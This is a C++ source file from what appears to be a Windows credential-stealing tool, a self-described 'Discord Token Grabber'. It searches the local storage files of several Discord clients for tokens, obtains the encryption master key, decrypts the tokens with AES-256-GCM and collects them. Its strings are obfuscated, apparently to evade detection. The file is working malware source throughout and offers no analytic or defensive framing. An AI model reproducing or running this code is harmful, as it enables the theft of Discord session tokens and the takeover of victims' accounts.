#include "discord.hpp"

#include <Windows.h>
#include <filesystem>
#include <regex>
#include <iostream>
#include <string>
#include "crypto.hpp"
#include "glob.hpp"
#include "base64.hpp"
#include "os.hpp"
#include "Deduplicator.hpp"
#include "obfusheader.h"
#include "Helper.h"

namespace fs = std::filesystem;

const std::regex token_regex(OBF(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^"]*)"));
const std::regex normal_regex(OBF(R"(([\d\w_-]{24,26}\.[\d\w_-]{6}\.[\d\w_-]{25,110}))"));
// TO NOT USE C++20
bool starts_with(const std::string& str, const std::string& prefix) {
    return str.size() >= prefix.size() && str.compare(0, prefix.size(), prefix) == 0;
}

void GetLDBFiles(const fs::path& path, std::vector<DiscordDir>& files) {
    const fs::path localStatePath = path / "Local State";
    if (fs::exists(localStatePath)) {
        DiscordDir discord_dir;
        discord_dir.LocalState = localStatePath.string();
        for (auto& p : glob::rglob({ path.string() + OBF(R"(\Local Storage\leveldb\*.ldb)"), path.string() + OBF(R"(\Local Storage\leveldb\*.log)") })) {
            discord_dir.LocalStorage.push_back(p.string());
        }
        files.push_back(discord_dir);
    }
}


std::vector<DiscordDir> GetDiscordPaths() {
    std::vector<DiscordDir> paths;
    const fs::path appdatapath = OS::getenv(OBF("APPDATA"));
    std::vector<std::string> predefined_paths = {
        appdatapath.string() + OBF(R"(\discord)"),
        appdatapath.string() + OBF(R"(\discordcanary)"),
        appdatapath.string() + OBF(R"(\Lightcord)"),
        appdatapath.string() + OBF(R"(\discordptb)")
    };
    for (const auto& path : predefined_paths) {
        GetLDBFiles(path, paths);
    }

    return paths;
}

void searchToken(const std::vector<std::string>& localstorage, const std::string& master_key, std::vector<std::string>& tokens) {
    for (const auto& local_storage : localstorage) {
        std::string chunk = OS::ReadFile(local_storage);
        if (chunk.empty()) continue;

        std::smatch match, match2;
        std::regex_search(chunk, match, token_regex);
        std::regex_search(chunk, match2, normal_regex);

        if (match[0].str().empty() && match2[1].str().empty()) continue;

        std::string encrypted_token = match[0].str().empty() ? match2[1].str() : match[0].str();
        std::string token;

        if (starts_with(encrypted_token, OBF("dQw4w9WgXcQ"))) {
            encrypted_token = base64_decode(encrypted_token.substr(12));
            token = Crypto::AES256GCMDecrypt(master_key, { encrypted_token.begin(), encrypted_token.end() });
        }
        else {
            token = encrypted_token;
        }

        if (!token.empty()) tokens.push_back(token);
    }
}

std::vector<std::string> Discord::GetTokens() {
    DEBUG_PRINT(L"Discord Token Grabber Started");
    std::vector<std::string> tokens;
    std::vector<DiscordDir> paths = GetDiscordPaths();
    for (const auto& discord_dir : paths) {
        std::string master_key = Crypto::GetMasterKey(discord_dir.LocalState);
        if (master_key.empty()) continue;
        searchToken(discord_dir.LocalStorage, master_key, tokens);
    }

    DEBUG_PRINT(L"Discord Token Grabber Passed");
    return Deduplicate(tokens);
}
